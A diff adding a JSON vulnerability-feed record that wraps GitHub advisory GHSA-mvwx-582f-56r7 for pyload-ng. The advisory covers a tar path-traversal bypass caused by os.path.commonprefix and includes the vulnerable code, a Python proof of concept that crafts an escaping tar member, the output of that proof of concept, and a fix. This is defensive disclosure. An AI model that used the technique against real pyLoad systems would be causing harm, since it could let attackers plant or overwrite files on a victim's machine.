@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-35592\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"## Summary\\n\\nThe `_safe_extractall()` function in `src/pyload/plugins/extractors/UnTar.py` uses `os.path.commonprefix()` for its path traversal check, which performs character-level string comparison rather than path-level comparison. This allows a specially crafted tar archive to write files outside the intended extraction directory. The correct function `os.path.commonpath()` was added to the codebase in the GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) but was never applied to `_safe_extractall()`, making this an incomplete fix.\\n\\n## Details\\n\\nThe GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) added a correct `is_within_directory()` function to `src/pyload/core/utils/fs.py:384-391` using `os.path.commonpath()`:\\n\\n```python\\n# fs.py:384 — CORRECT implementation\\ndef is_within_directory(base_dir, target_dir):\\n    real_base = os.path.realpath(base_dir)\\n    real_target = os.path.realpath(target_dir)\\n    return os.path.commonpath([real_base, real_target]) == real_base\\n```\\n\\nHowever, the `_safe_extractall()` function in `UnTar.py:10-22` was left unchanged with the broken `os.path.commonprefix()`:\\n\\n```python\\n# UnTar.py:10-22 — VULNERABLE implementation\\ndef _safe_extractall(tar, path=\\\".\\\", members=None, *, numeric_owner=False):\\n    def _is_within_directory(directory, target):\\n        abs_directory = os.path.abspath(directory)\\n        abs_target = os.path.abspath(target)\\n        prefix = os.path.commonprefix([abs_directory, abs_target])  # BUG: line 14\\n        return prefix == abs_directory\\n\\n    for member in tar.getmembers():\\n        member_path = os.path.join(path, member.name)\\n        if not _is_within_directory(path, member_path):\\n            raise ArchiveError(\\\"Attempted Path Traversal in Tar File (CVE-2007-4559)\\\")\\n\\n    tar.extractall(path, members, numeric_owner=numeric_owner)\\n```\\n\\n`os.path.commonprefix()` is a **string operation**, not a path operation. For extraction destination `/downloads/pkg` and a malicious member `../pkg_evil/payload` (resolving to `/downloads/pkg_evil/payload`):\\n\\n- `commonprefix(['/downloads/pkg', '/downloads/pkg_evil/payload'])` → `'/downloads/pkg'` — **equals the directory, check passes**\\n- `commonpath(['/downloads/pkg', '/downloads/pkg_evil/payload'])` → `'/downloads'` — **does NOT equal the directory, check correctly fails**\\n\\nThe extraction path is reached via: `ExtractArchive.package_finished()` (line 182) → `extract_queued()` → `UnTar.extract()` (line 76) → `_safe_extractall(t, self.dest)` (line 81).\\n\\n## PoC\\n\\nSelf-contained proof of concept demonstrating the bypass:\\n\\n```python\\nimport tarfile, io, os, shutil\\n\\ndest = '/tmp/test_extraction_dir'\\nshutil.rmtree(dest, ignore_errors=True)\\nshutil.rmtree('/tmp/test_extraction_dir_pwned', ignore_errors=True)\\nos.makedirs(dest, exist_ok=True)\\n\\n# Step 1: Create malicious tar with member that escapes via prefix trick\\nwith tarfile.open('/tmp/evil.tar.gz', 'w:gz') as tar:\\n    info = tarfile.TarInfo(name='../test_extraction_dir_pwned/evil.txt')\\n    data = b'escaped the sandbox!'\\n    info.size = len(data)\\n    tar.addfile(info, io.BytesIO(data))\\n\\n# Step 2: Reproduce the vulnerable check from UnTar.py:11-15\\ndef _is_within_directory(directory, target):\\n    abs_directory = os.path.abspath(directory)\\n    abs_target = os.path.abspath(target)\\n    prefix = os.path.commonprefix([abs_directory, abs_target])\\n    return prefix == abs_directory\\n\\n# Step 3: Verify the check is bypassed\\nwith tarfile.open('/tmp/evil.tar.gz') as tar:\\n    for member in tar.getmembers():\\n        member_path = os.path.join(dest, member.name)\\n        bypassed = _is_within_directory(dest, member_path)\\n        print(f'Member: {member.name}')\\n        print(f'Resolved: {os.path.abspath(member_path)}')\\n        print(f'Check passes (should be False): {bypassed}')\\n    tar.extractall(dest)\\n\\n# Step 4: Confirm file was written outside extraction directory\\nescaped_file = '/tmp/test_extraction_dir_pwned/evil.txt'\\nassert os.path.exists(escaped_file), \\\"File did not escape\\\"\\nprint(f'File escaped to: {escaped_file}')\\nprint(f'Content: {open(escaped_file).read()}')\\n```\\n\\nOutput:\\n```\\nMember: ../test_extraction_dir_pwned/evil.txt\\nResolved: /tmp/test_extraction_dir_pwned/evil.txt\\nCheck passes (should be False): True\\nFile escaped to: /tmp/test_extraction_dir_pwned/evil.txt\\nContent: escaped the sandbox!\\n```\\n\\n## Impact\\n\\nAn attacker who hosts a malicious `.tar.gz` archive on a file hosting service can write files to arbitrary sibling directories of the extraction path when a pyLoad user downloads and extracts the archive. This enables:\\n\\n- Writing files outside the intended extraction directory into adjacent directories\\n- Overwriting other users' downloads\\n- Planting malicious files in predictable locations on disk\\n- If combined with other primitives (e.g., writing a `.bashrc`, cron job, or plugin file), this could lead to code execution\\n\\nThe attack requires the victim to download a malicious archive (either manually or via the pyLoad API with ADD permission) and have the ExtractArchive addon enabled.\\n\\n## Recommended Fix\\n\\nReplace the broken inline `_is_within_directory` with the correct `is_within_directory` from `pyload.core.utils.fs`:\\n\\n```python\\nimport os\\nimport sys\\nimport tarfile\\n\\nfrom pyload.core.utils.fs import is_within_directory, safejoin\\nfrom pyload.plugins.base.extractor import ArchiveError, BaseExtractor, CRCError\\n\\n\\n# Fix for tarfile CVE-2007-4559\\ndef _safe_extractall(tar, path=\\\".\\\", members=None, *, numeric_owner=False):\\n    for member in tar.getmembers():\\n        member_path = os.path.join(path, member.name)\\n        if not is_within_directory(path, member_path):\\n            raise ArchiveError(\\\"Attempted Path Traversal in Tar File (CVE-2007-4559)\\\")\\n\\n    tar.extractall(path, members, numeric_owner=numeric_owner)\\n```\\n\\nThis removes the broken inline function and uses the already-existing correct implementation that was added in the GHSA-7g4m-8hx2-4qh3 fix.\", \"epss\": {\"percentage\": 0.00255, \"percentile\": 0.16636}, \"ghsa_id\": \"GHSA-mvwx-582f-56r7\", \"github_reviewed_at\": \"2026-04-08T00:04:37Z\", \"html_url\": \"https://github.com/advisories/GHSA-mvwx-582f-56r7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-mvwx-582f-56r7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-35592\"}], \"nvd_published_at\": \"2026-04-07T17:16:34Z\", \"published_at\": \"2026-04-08T00:04:37Z\", \"references\": [\"https://github.com/pyload/pyload/security/advisories/GHSA-mvwx-582f-56r7\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-35592\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-124.yaml\", \"https://github.com/advisories/GHSA-mvwx-582f-56r7\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-mvwx-582f-56r7\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/pyload/pyload\", \"summary\": \"pyload-ng: Incomplete Tar Path Traversal Fix in UnTar._safe_extractall via os.path.commonprefix Bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T19:47:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-mvwx-582f-56r7\", \"vulnerabilities\": [{\"first_patched_version\": \"0.5.0b3.dev97\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyload-ng\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.5.0b3.dev97\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-mvwx-582f-56r7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyload-ng: < 0.5.0b3.dev97"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2007-4559",
+      "CVE-2026-35592"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyload-ng"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.399413Z",
+  "provenance": {
+    "content_sha256": "e7bb92e79e1de999cdf5b159a846c4ea0a0e53bb63ef132a4695212f6b709582",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-08T00:04:37Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-mvwx-582f-56r7",
+  "status": "active",
+  "title": "pyload-ng: Incomplete Tar Path Traversal Fix in UnTar._safe_extractall via os.path.commonprefix Bypass",
+  "updated_at": "2026-06-08T19:47:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-mvwx-582f-56r7"
+}
